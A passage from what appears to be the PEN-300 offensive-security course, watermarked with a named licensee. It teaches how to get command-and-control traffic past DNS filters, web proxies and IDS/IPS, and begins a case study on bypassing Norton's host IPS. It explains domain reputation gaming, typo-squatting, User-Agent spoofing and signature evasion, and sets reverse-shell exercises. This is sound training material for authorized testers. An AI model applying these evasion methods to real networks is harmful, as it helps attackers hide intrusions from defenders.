482 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
312 
 
Figure 113: Bypassing AppLocker with XSL transformation 
This application whitelisting technique can also be leveraged through a shortcut file that we 
provide to the victim. To weaponize this, we can modify the Jscript code inside the XSL file to 
contain a DotNetToJscript C# shellcode runner or any other payload we desire. 
8.5.2.1 Exercises 
1. 
Repeat the actions in this section to create a proof of concept XSL file and execute a 
transformation through WMIC. 
2. 
Modify the XSL file to use DotNetToJscript and obtain a reverse Meterpreter shell. 
8.5.2.2 Extra Mile 
PowerShell Empire483 is a well-known framework for post-exploitation, specifically geared towards 
Active Directory exploitation. It can also generate client-side code execution payloads. 
An alternative and newer framework called Covenant484 is written in C# and implements much of 
the same functionality. To obtain code execution on a Windows host an implant called a Grunt is 
used. 
Install485 the Covenant framework on your Kali machine and use knowledge and techniques from 
this module to obtain code execution through a Grunt in the face of AppLocker restrictions. 
8.6 Wrapping Up 
In this module, we have outlined the concept of application whitelisting and bypassed AppLocker, 
which blocks much of our previous tradecraft. 
 
483 (Empire, 2020), https://www.powershellempire.com/ 
484 (Ryan Cobb, 2019), https://cobbr.io/Covenant.html 
485 (Ryan Cobb, 2020), https://github.com/cobbr/Covenant/wiki/Installation-And-Startup 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
313 
We have introduced various techniques to bypass many types of AppLocker rules, ranging from 
simple bypasses to much more complicated bypasses that leverage other native, trusted, and 
undocumented applications. 
We also updated our tradecraft to execute and gain client-side execution on a hardened 
workstation, allowing us to continue our post-exploitation tactics. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
314 
 
9 Bypassing Network Filters 
In previous modules we discussed various command and control (C2) techniques. In this module, 
we will discuss the various defense solutions we may encounter in an enterprise environment and 
address the challenges these solutions pose to our C2 network traffic. We will discuss the 
strengths, weaknesses, and important details of a variety of solutions and examine their 
monitoring and blocking strategies. Since each of these solutions can affect the outcome of a 
penetration test, we will also discuss a variety of strategies to bypass these solutions. 
Let’s begin with an overview of the various solutions we may encounter, each of which is typically 
deployed in an enterprise as part of the Internet Edge486 network architecture. Although this model 
considers both ingress (inbound) and egress (outbound) traffic, in this case we will focus on the 
latter, since it is assumed that we have already compromised the target network and control one 
or more systems within. Commonly, outbound traffic is routed through a series of systems where 
it is inspected and processed before routing it to the Internet or blocking it due to a violation. The 
tools used in this model may include simple IP address filters or more complex Intrusion 
Detection Systems (IDS)487 and web proxy488 filters. These advanced tools may perform deep 
packet inspection,489 analyzing the entirety of the network application layer’s content. 
In addition, a packet capture device (which is typically not inline with the traffic) may copy the 
entirety of a network’s data for use in digital forensic investigation490 activities. Although this type 
of solution can not block traffic, it may alert system administrators or incident response teams, 
who may in turn block our traffic. 
Consider Figure 114, which shows a rather comprehensive Internet edge architecture installation. 
 
Figure 114: Internet edge architecture 
Let’s discuss this configuration in more detail, tracing egress traffic sourced from the internal 
devices. 
 
486 (Cisco, 2020), https://www.cisco.com/c/en/us/td/docs/solutions/Enterprise/Security/SAFE_RG/SAFE_rg/chap6.html 
487 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Intrusion_detection_system 
488 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Proxy_server 
489 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Deep_packet_inspection 
490 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Digital_forensics 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
315 
First, if the egress traffic relies on name resolution, some edge DNS servers may perform domain 
filtering, which can deny disallowed domains. 
Next, allowed egress traffic will pass through an internal firewall, which will generally limit traffic 
based on IP address and port number. Specifically, most solutions rely on a blocklist, which acts 
as a first-pass protection mechanism but also reduces the load on downstream devices. As an 
example, if an organization doesn’t allow egress SMB traffic, it can be filtered out early, at this 
stage. 
At this point, the traffic may pass through an SSL inspection491 device, which essentially performs 
SSL decryption and re-encryption, allowing the device to inspect SSL-encrypted traffic. The traffic 
is typically re-encrypted when it leaves this zone. 
If the traffic is still allowed, it may next pass through a traffic filter, like a proxy server or an IDS, 
and the data may be copied to a full packet capture device. 
Next, the traffic may pass through an external firewall that may filter egress traffic (in addition to 
filtering ingress traffic as expected). 
If the traffic passes these inspection points, it is then routed to the Internet. 
Since this type of comprehensive solution is costly and complicated, some organizations may 
simplify, excluding certain functionality or relying on multi-function devices that combine some of 
this functionality into a single unit. For example, a proxy server may serve as not only a proxy but 
may also perform IDS, SSL inspection, and domain filtering. 
As penetration testers, we are not necessarily concerned with the actual devices. Instead, we 
must know how to identify the deployed defensive tactics and understand how to evade them 
well enough to successfully complete our assessment. Inevitably, in many cases our traffic will be 
logged. Our goal in this module will often be to normalize our traffic, “hiding within the noise”, 
such that our activity will fall below the detection threshold. 
Before we proceed, let’s take a moment to discuss the lab configuration for this module, which is 
configured as follows: 
 
Figure 115: Lab setup 
 
491 (Open Rights Group, 2019), https://wiki.openrightsgroup.org/wiki/TLS_interception 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
316 
 
The lab includes a Windows 10 machine named client and an Ubuntu Linux machine named 
ubuntu. The Ubuntu system serves as an edge defense machine and will handle all defensive 
tasks. It’s running DNS for name resolution, an Nginx492 web server, and Snort,493 which is set to 
capture all network traffic. Most of the Snort rules are turned off for now, but a few custom rules 
that enable basic filtering are installed. 
From an external perspective, we can SSH to the Ubuntu system from our Kali machine. The 
Windows 10 machine is behind the Ubuntu machine, which means we can’t access it directly. 
However, a port forwarding rule forwards RDP requests so we can RDP to the Windows client by 
connecting to the Ubuntu machine on TCP port 3389. 
Note that in previous modules, we relied on IP addresses when connecting to our listeners. 
However, in the real world, domain names are more practical and flexible for several reasons. 
First, we can easily move our C2 server (listener) to another location by simply updating the DNS 
record. In addition, since direct-to-IP connections are often considered anomalous, we’ll perform 
a DNS lookup to connect to our C2 server and adopt a more typical network pattern. 
Given these benefits, we will only connect to reverse shells by domain name to assist in various 
filter bypasses. 
Armed with basic knowledge of defense systems and a properly configured lab, we’ll cover the 
various system components in more detail and demonstrate various bypass techniques. Later in 
this module, we’ll also examine domain fronting and DNS tunneling and discuss how they relate to 
network filter evasion. 
9.1 DNS Filters 
DNS filters are typically one of the first defenses that we’ll need to consider as penetration 
testers. If we were to perform a DNS lookup from a target network, that request might traverse 
through several DNS servers inside the target environment, eventually passing to a device that 
performs DNS filtering. This may occur on the client’s network, or the request may be forwarded 
to an Internet-based DNS provider service, like OpenDNS.494 
At a basic level, most DNS filters compare requested domains to a blocklist of well-known 
malicious domain names. If the domain name is on the blocklist, it is filtered. One of the better 
known open lists is malwaredomainlist.495 Additionally, advanced systems may use advanced 
heuristics techniques as well. 
If the requested domain is on the blocklist, DNS filtering systems may drop the request (returning 
nothing) or return a sinkhole, or fake, IP address. A sinkhole IP will often either redirect to a block 
page, which presents an error or warning to the user, or to a monitoring device that captures 
further traffic, which can be analyzed. In some cases, it may simply be dropped. 
 
492 (F5, 2020), https://www.nginx.com/ 
493 (Cisco, 2020), https://www.snort.org/ 
494 (OpenDNS, 2020), https://www.opendns.com/ 
495 (MalwareDomainList.com, 2020), https://www.malwaredomainlist.com/hostslist/hosts.txt 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
317 
 
A sinkhole can be a powerful weapon in the right hands. This was exceptionally 
highlighted in May 2017, when the WannaCry ransomware quickly infected 
approximately 200000 machines in 150 countries. The developer coded a simple 
sinkhole “kill switch” that relied on the DNS resolution and HTTP service of the 
iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com domain. If this request was 
successful, the malware would terminate. Malware analyst Marcus Hutchins 
registered the domain, stood up a web server to reply to the malware, and 
effectively stopped the malware’s outbreak. This was possible because the 
malware developer didn’t initially register the kill switch domain. 
Let’s demonstrate this process with an OpenDNS sinkhole. OpenDNS maintains the 
www.internetbadguys.com test domain,496 which is used to showcase their blocking service. If we 
resolve this IP with OpenDNS’s server (208.67.222.222), we should receive one of a variety of 
sinkhole497 IP addresses. On the other hand, Google’s DNS server (8.8.8.8) resolves this as 
67.215.92.210. 
Let’s try this out from our Kali machine that has Internet access. First, we’ll set our DNS server to 
Google. 
kali@kali:~$ sudo bash -c "echo nameserver 8.8.8.8 > /etc/resolv.conf"  
Listing 392 - Changing nameserver in Kali 
Then we’ll resolve the domain name with nslookup. 
kali@kali:~$ nslookup www.internetbadguys.com 
Server:         8.8.8.8 
Address:        8.8.8.8#53 
 
Non-authoritative answer: 
Name:   www.internetbadguys.com 
Address: 67.215.92.210 
Listing 393 - Doing domain lookup with Google’s servers 
This returns the public IP address instead of the sinkhole IP. By extension, if we load 
www.internetbadguys.com in a browser, we receive the following page: 
 
496 (OpenDNS, 2020), https://support.opendns.com/hc/en-us/articles/227986567-How-to-test-for-successful-OpenDNS-configuration- 
497 (OpenDNS, 2020), https://support.opendns.com/hc/en-us/articles/227986927-What-are-the-Cisco-Umbrella-Block-Page-IP-
Addresses- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
318 
 
Figure 116: OpenDNS test domain, not blocked 
If this were a real phishing site, we would have loaded it in our browser. Now let’s switch to an 
OpenDNS server. 
kali@kali:~$ sudo bash -c "echo nameserver 208.67.222.222 > /etc/resolv.conf" 
Listing 394 - Changing nameserver in Kali 
Next, we’ll try the lookup again. 
kali@kali:~$ nslookup www.internetbadguys.com 
Server:         208.67.222.222 
Address:        208.67.222.222#53 
 
Non-authoritative answer: 
Name:   www.internetbadguys.com 
Address: 146.112.61.108 
Name:   www.internetbadguys.com 
Address: ::ffff:146.112.61.108 
Listing 395 - Doing domain lookup with OpenDNS’s servers 
This returns a different IP. 
With our DNS server updated, let’s browse www.internetbadguys.com again. Note that due to DNS 
caching, we may need to restart the browser to properly retrieve the new page. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
319 
 
Figure 117: OpenDNS block page 
This redirects to a block page, categorized as an OpenDNS “Phishing threat”. 
Note that since Cisco acquired OpenDNS, the page (and the OpenDNS product) 
has been rebranded to “Cisco Umbrella”. 
In addition to solutions like OpenDNS, DNS servers can integrate domain reputation lookup 
solutions (like IPVoid498 and VirusTotal499), which query multiple DNS filtering providers, aggregate 
the responses, and make a weighted decision about reputability of the domain. 
For example, let’s check the reputation of textspeier.de with IPVoid. Note that some browser 
extensions (like uBlock Origin) will break the IPVoid site’s functionality so we may need to try this 
in various browsers or disable browser extensions. 
 
498 (NoVirusThanks, 2020), https://www.ipvoid.com/dns-reputation/ 
499 (VirusTotal, 202), https://www.virustotal.com/gui/home/search 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
320 
 
Figure 118: IPVoid results for textspeier.de 
The output indicates that this domain is considered unsafe by many domain reputation services. 
In addition to the simple suggestion to pass or block a domain, many modern filtering systems 
rely on domain categorization, similar to the “Phishing” diagnosis provided by OpenDNS in our 
previous example.500 For example, if an enterprise blocks users from accessing webmail or 
movie-related domains, we should avoid this categorization for our C2 server. 
As a simple example, let’s look up cnn.com with the OpenDNS categorization checker.501 
 
500 (OpenDNS, 2020), https://community.opendns.com/domaintagging/categories 
501 (OpenDNS, 2020), https://community.opendns.com/domaintagging/search/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
321 
 
Figure 119: OpenDNS test domain, not blocked 
In this case, cnn.com is categorized as a “News/Media” site. 
Armed with a basic understanding of DNS filters, let’s shift our focus to bypass techniques. 
9.1.1.1 Exercises 
1. 
Repeat the steps above to test OpenDNS blocking. 
2. 
Obtain various domain reputation results with IPVoid. 
9.1.2 Dealing with DNS Filters 
When confronting a DNS filter, our goal is to select a domain that appears legitimate, is likely 
allowed by the target’s policy, and not blocked. We’ll address each of these requirements in this 
section and suggest methods for meeting them. 
It may seem logical to register a new domain, but it may be categorized as a Newly Seen 
Domain.502 This can be equally detrimental to the reputation score, since penetration testers and 
malware authors often use brand new domains. Domains in this category are often less than one 
week old and are relatively unused, lacking inquiries and traffic. Because of this, we should collect 
domain names in advance and generate lookups and traffic well in advance of an engagement. 
However, even if our domain is classified as clean, we need to make sure its domain category 
matches what the client allows. 
For example, the “webmail” classification is often disallowed given the increased risk of 
downloaded malware. In most cases, we should pre-populate a web site on our domain with 
seemingly harmless content (like a cooking blog) to earn a harmless category classification. We 
can even go so far as to subscribe to domain categorization services (like the previously-
mentioned OpenDNS site503) so we can submit our own domain classifications. Even if our 
domain has been categorized as malicious, we can easily host a legitimate-looking website on the 
domain and request re-categorization. 
 
502 (Cisco Umbrella, 2020), https://support.umbrella.com/hc/en-us/articles/235911828-Newly-Seen-Domains-Security-Category 
503 (OpenDNS, 2020), https://community.opendns.com/domaintagging/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
322 
To demonstrate, we can submit a vote request for an OpenDNS tag for the parcelsapp.com 
domain, which is a popular parcel tracking website. We could also vote on other user’s 
submissions as well.504 
 
Figure 120: OpenDNS vote for parcelsapp.com domain 
We can also submit the domain for a community review if voting is not available or if we would 
like to suggest a different category. 
 
Figure 121: Submit category for parcelsapp.com domain 
 
504 (OpenDNS, 2020), https://community.opendns.com/domaintagging/search/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
323 
 
In addition to guarding and monitoring our domain’s reputation, we should take steps to make the 
domain name itself appear legitimate. For example, a domain name consisting of legitimate-
sounding text is less suspicious than a domain consisting of random numbers and characters, 
especially when examined by natural language processing505 filtering systems. 
One technique popularized by malware authors and penetration testers is known as typo-
squatting,506 which leverages subtle changes in recognizable domain names. For example, if our 
target uses example.com, we could register the examp1e.com, which is visually similar. Additional 
examples may include examlpe.com, exomple.com, or examplle.com. 
Although this technique could entice a user to click a phishing link, some services 
can filter and issue alerts regarding typo-squatted domains. 
Finally, we must be aware of the status of the IP address of our C2 server. If the IP has been 
flagged as malicious, some defensive solutions may block the traffic. This is especially common 
on shared hosting sites in which one IP address hosts multiple websites. If one site on the shared 
host ever contained a browser exploit or was ever used in a watering hole507 malware campaign, 
the shared host may be flagged. Subsequently, every host that shares that IP may be flagged as 
well, and our C2 traffic may be blocked. 
To guard against this, we should use a variety of lookup tools, like the previously-mentioned 
Virustotal and IPVoid sites to check the status of our C2 IP address before an engagement. 
To recap, when faced with a DNS filter, we should begin preparation well in advance and do our 
best to make the domain seem as legitimate as possible. We should ensure that our domains are 
in a likely-permissible category and we should have several domains prepared in advance so we 
can swap them out as needed during an engagement. 
Now that we’ve examined DNS filter bypasses, we’ll move on to the most common filtering 
device: the web proxy server. 
9.1.2.1 Exercise 
1. 
Using OpenDNS, check the categorization of a couple of domains. 
9.2 Web Proxies 
Although proxy servers support many protocols, the most common outbound filtering system is a 
web proxy server,508 which can inspect and manipulate HTTP and HTTPS connections. 
 
505 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Natural_language_processing 
506 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Typosquatting 
507 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Watering_hole_attack 
508 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Proxy_server 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
324 
Simply put, web proxy servers accept and forward web traffic on behalf of a client, for example, a 
web browser. This is often done in a Network Address Translation (NAT) environment, in which 
the internal private source IP addresses509 are translated into Internet-routable addresses. 
If a user on an internal network requests an external web-based resource, and the network 
enforces the use of a proxy, the request will be sent to the proxy server, which will terminate the 
connection and initiate a new one to the outside world. 
This is illustrated in Figure 122. 
 
Figure 122: Typical proxy operation 
In this figure, the Workstation client sends a web request to www.example.com but because of 
the proxy configuration, the request is actually sent to the proxy server (with a destination 
address of 10.0.0.254) first. The proxy server will then NAT the connection, setting the source IP 
to its own public IP, and setting the destination IP to the real IP of the server hosting 
www.example.com. 
In Figure 122, the proxy passes on the GET request for index.html to www.example.com and may 
also read, insert, delete, or modify HTTP headers such as the User-Agent (which defines the 
browser type). 
By acting as a Man-In-The-Middle (MITM),510 a web proxy is an excellent single-unit defensive tool 
that can perform URL and IP filtering and HTTPS inspection. For example, it could block traffic 
based on fields such as the User-Agent to disallow certain browsers. It can also actively modify 
data within a connection including the HTTP headers.511 
 
509 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Private_network 
510 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Man-in-the-middle_attack 
511 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
325 
Similar to a DNS filter, a web filter can inspect (and manipulate) full URLs and is database-driven, 
filtering by blocklists or categories. If a URL is disallowed, the proxy will often return a block page. 
Even if the traffic is allowed, the request details, like common HTTP headers (Host, User-Agent, 
Referer, etc) as well as the request method and resource path will almost certainly be logged. If 
the company uses a central log server with a Security Information and Event Management 
(SIEM)512 system, the proxy logs might be subject to a second review and if something is 
suspicious, an alert might be generated. 
Since this could jeopardize our penetration test, we must tread carefully and employ a variety of 
bypass, obfuscation, and normalization techniques on our web-based traffic. In the next section, 
we’ll explore a few of these techniques. 
9.2.1 Bypassing Web Proxies 
When dealing with proxy servers, we should first ensure that our payload is proxy-aware. When 
our payload tries to connect back to the C2 server, it must detect local proxy settings, and 
implement those settings instead of trying to connect to the given domain directly. Fortunately, 
Meterpreter’s HTTP/S payload is proxy-aware, (thanks to the InternetSetOptionA513 API), so we 
can leverage that. 
Armed with a proxy-aware payload, we must consider many of the protection mechanisms 
implemented by the web-proxy filter. We must ensure that the domain and URL are clean and that 
our C2 server is safely categorized as defined by our client’s policy rules. If the client has deployed 
a URL verification or categorization system, like those provided by Cyren,514 Symantec 
Bluecoat,515 or Checkpoint,516 we should factor their policy settings into our bypass strategy. 
For example, the following figure demonstrates a Symantec Bluecoat517 categorization lookup. 
 
512 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Security_information_and_event_management 
513 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetsetoptiona 
514 (Cyren, 2020), https://www.cyren.com/security-center/url-category-check 
515 (Symantec Corporation, 2020), https://sitereview.bluecoat.com/ 
516 (Check Point Software Technologies Ltd., 2020), https://urlcat.checkpoint.com/urlcat/ 
517 (Symantec Corporation, 2020), https://sitereview.bluecoat.com/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
326 
 
Figure 123: Symantec website categorization 
The output indicates that the makehamburgers.com domain is uncategorized. If we were using 
this as our C2 server, we should follow the prompts to categorize it according to the company’s 
allowed use policy, since an unnamed domain will likely be flagged. 
We could also grab a seemingly-safe domain by hosting our C2 in a cloud service or Content 
Delivery Network (CDN), which auto-assigns a generic domain. These could include domains such 
as cloudfront.net, wordpress.com, or azurewebsites.net. These types of domains are often auto-
allowed since they are used by legitimate websites and hosting services. 
Now that we’ve considered our payload and C2 server domains and URLs, we can consider the 
traces our C2 session will leave in the proxy logs. For example, instead of simply generating 
custom TCP traffic on ports 80 or 443, our session should conform to HTTP protocol standards. 
Fortunately, many framework payloads, including Metasploit’s Meterpreter, follow the standards 
as they use HTTP APIs like HttpOpenRequestA.518 
We’ll also need to ensure that we set our User-Agent to a browser type that is permitted by the 
organization. For example, if we know that the organization we are targeting uses Microsoft 
 
518 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequesta 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
327 
Windows with Edge, we should set it accordingly. In this scenario, a User-Agent for Chrome 
running on macOS will likely raise suspicion or might be blocked. 
In order to determine an allowed User-Agent string, we could consider social engineering or we 
could sniff HTTP packets from our internal point of presence. Additionally, we could use a site like 
useragentstring.com519 to build the string or choose from a variety of user-supplied strings. 
 
Figure 124: Analyzing the Edge User Agent string 
In Figure 124, we analyzed an Edge-based User-Agent and received detailed information about 
the client. Besides the browser, we also got information about the operating system, its version 
number, the engine of the browser, and much more. 
If we don’t know what is being used, we can always check the exact value ourselves with a packet 
capture. 
 
519 (UserAgentString.com, 2020), http://www.useragentstring.com/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
328 
Once we have selected a User-Agent string, we can apply it to our framework of choice. For 
example, we can set our custom User-Agent in Meterpreter with the HttpUserAgent advanced 
configuration option. 
In this section, we discussed web proxies, how they are similar to DNS filters, and how similar 
approaches help us bypass these filters. We also touched briefly on the HTTP protocol standard 
and discussed why it’s important to follow it in our payload. In the next section, we’ll discuss IDS 
and IPS sensors. 
9.2.1.1 Exercises 
1. 
Visit Symantec’s website categorization website520 and verify the category of a couple of 
random websites. 
2. 
Compare the domain categorization results for the same domains in OpenDNS and 
Symantec. 
9.3 IDS and IPS Sensors 
Traditionally, network Intrusion Detection Systems (IDS) or Intrusion Prevention Systems (IPS) 
protect against incoming malicious traffic. However, they are often used to filter outgoing traffic. 
The main difference between these devices is that an IPS is an active device sitting in-line of the 
traffic and can block traffic, while a traditional IDS is a passive device which does not sit inline 
and is designed to only alert. 
However, both devices will perform deep packet inspection. Large chunks of data are generally 
fragmented as they traverse the IP network, because some links have low Maximum 
Transmission Unit (MTU)521 values, which limits the size of packets that can be transferred over 
the network medium. This process is called IP fragmentation.522 Because of this fragmentation, 
IDS and IPS devices will first need to reassemble523 packets to reconstruct the data. The devices 
will then examine the content of the traffic beyond IP addresses and port numbers, and inspect 
application layer data in search of identifiable patterns defined by signatures. 
These signatures are often created by malware analysts using methods similar to antivirus 
signature creation and must be very specifically tuned for accuracy. This tuning process can work 
to our advantage, allowing us to evade detection by making very small changes to an otherwise 
suspicious traffic pattern. 
Let’s take a moment to discuss how this process might work. In 2015, Didier Stevens created a 
Snort rule to detect Meterpreter524 and his process is a great example of both traffic analysis and 
 
520 (Symantec Corporation, 2020), https://sitereview.bluecoat.com/ 
521 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Maximum_transmission_unit 
522 (Wikipedia, 2020), https://en.wikipedia.org/wiki/IP_fragmentation 
523 (Wireshark, 2020), https://www.wireshark.org/docs/wsug_html_chunked/ChAdvReassemblySection.html 
524 (Didier Stevens, 2015), https://blog.didierstevens.com/2015/05/11/detecting-network-traffic-from-metasploits-meterpreter-
reverse-http-module/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
329 
IDS/IPS rule creation. He observed many things about a typical Meterpreter connection, an 
example of which is shown in Figure 125 from Didier Steven’s website.525 
 
Figure 125: Packet capture of meterpreter traffic 
First, the client sends an HTTP POST request. The URI follows a consistent pattern. It begins with 
a checksum of four or five alphanumeric characters followed by an underscore and sixteen 
random alphanumeric characters. 
Let’s expand this POST’s TCP stream. 
 
Figure 126: Packet details of meterpreter traffic 
This stream526 reveals the POST URI as well as a four-byte payload containing a “RECV” string. 
This request was hardcoded in Meterpreter’s source code, and creates an easily-identifiable 
pattern, which is a perfect candidate for an IPS signature. The Meterpreter source code has since 
changed, invalidating this signature, but this example demonstrates the capabilities of a 
competent analyst performing signature analysis. 
In another example, Fox-It discovered that the popular Cobalt Strike C2 framework deviated from 
the HTTP protocol standard, as shown in this listing: 
 
525 (Didier Stevens, 2015), https://blog.didierstevens.com/2015/05/11/detecting-network-traffic-from-metasploits-meterpreter-
reverse-http-module/ 
526 (Didier Stevens, 2015), https://blog.didierstevens.com/2015/05/11/detecting-network-traffic-from-metasploits-meterpreter-
reverse-http-module/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
330 
 
Figure 127: Packet details of Cobalt Strike traffic 
They observed a single extraneous space following the HTTP Protocol specifier. Based on this, 
they published a rule designed to detect the use of Cobalt Strike in use on a network.527 
Since IPS and IDS sensors usually match a very unique pattern, the simplest way to bypass 
signature detection is to simply change our tool’s traffic pattern. Most major frameworks, like 
Meterpreter, Empire, and Covenant allow varying degrees of custom configuration options. We 
can manipulate these options in various ways to bypass IDS/IPS signatures. 
In the next section, we’ll demonstrate this as we bypass the Norton 360 host-based IPS system. 
9.3.1 Case Study: Bypassing Norton HIPS with Custom Certificates 
A Host-based IPS (HIPS) is an IPS that is often integrated into an endpoint software security suite. 
This type of system has full access to the host’s network traffic and as with a traditional IPS, can 
block traffic based on signatures. 
In this case study, we will demonstrate a bypass for the Norton HIPS that is bundled with Norton 
360528 and the Symantec Endpoint Protection529 enterprise solution. 
Although this product can detect and block standard Meterpreter sessions, it is signature-based, 
which means we can bypass it with simple network traffic modifications. 
Specifically, this product detects the standard Meterpreter HTTPS certificate. Certificates are 
used to ensure (or certify) the identity of a domain. They are also used to encrypt network traffic 
through a variety of cryptographic mechanisms. Normally, certificates are issued by trusted 
authorities called Certificate Authorities (CA),530 which are well-known. For example, the CA 
trusted root certificates531 are pre-installed on most operating systems, which streamlines 
validation. 
Let’s dig into our case study by first installing Norton IPS on the Windows 10 client. The installer 
(N360-ESD-22.20.4.57-EN.exe) is on the offsec user’s desktop. We’ll simply double-click the 
executable, click Install, and optionally deselect the Norton Community option since the VM is not 
Internet-connected. 
 
527 (Fox IT, 2019), https://blog.fox-it.com/2019/02/26/identifying-cobalt-strike-team-servers-in-the-wild/ 
528 (NortonLifeLock Inc., 2020), https://us.norton.com/360 
529 (Broadcom, 2020), https://www.broadcom.com/products/cyber-security/endpoint/end-user 
530 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Certificate_authority 
531 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Root_certificate 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
331 
 
Figure 128: Installing Norton 360 
Following this, we’ll simply close the presented registration window. 
To simulate an attack, we’ll set up a reverse HTTPS Meterpreter multi/handler listener on our Kali 
machine. Next, we’ll connect to the reverse shell from our browser. It’s important that we use our 
browser to connect for this case study because our focus is on the certificate that is generated 
and not the Meterpreter traffic itself. 
This connection is blocked immediately and Norton 360 generates a popup on the Windows 10 
desktop flagging the Meterpreter Reverse HTTPS session. 
 
Figure 129: Norton alert: Meterpreter Reverse HTTPS 
Clicking View Details reveals further information, including our Kali attack machine’s IP and port, 
the local IP and port (referred to as Destination Address), the date and time of the connection, and 
a description of the alert. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
332 
 
Figure 130: Norton alert details 
Since the alert refers to an HTTPS signature, let’s take a moment to view the offending signature. 
To do this, we must first stop the IPS functionality within Norton 360. 
This setting is available in the Security tab under the Advanced section. 
 
Figure 131: Norton Security -> Advanced 
From here, we’ll switch off Intrusion Prevention. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
333 
 
Figure 132: Norton Switch Off IPS 
With intrusion prevention switched off, we’ll connect to our listener again from the Windows 10 
browser. The browser presents a certificate error because Meterpreter is using a self-signed 
certificate, which means it wasn’t certified by a trusted CA. 
Let’s view that certificate. 
 
Figure 133: Random meterpreter certificate 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
334 
 
Next, we’ll restart the Meterpreter listener on our Kali machine and connect again. This will throw 
the certificate error again. However, the certificate has changed: 
 
Figure 134: Random meterpreter certificate 
Notice that every detail of the certificate has changed. Meterpreter randomizes this certificate in 
an attempt to evade signature detection. 
However, if we were to re-enable Norton’s IPS feature, this certificate would flag as well. Since we 
don’t understand exactly why this is flagging, we can begin with two safe assumptions. Norton 
may be flagging this because it’s a self-signed certificate. If this were the case, we could use a 
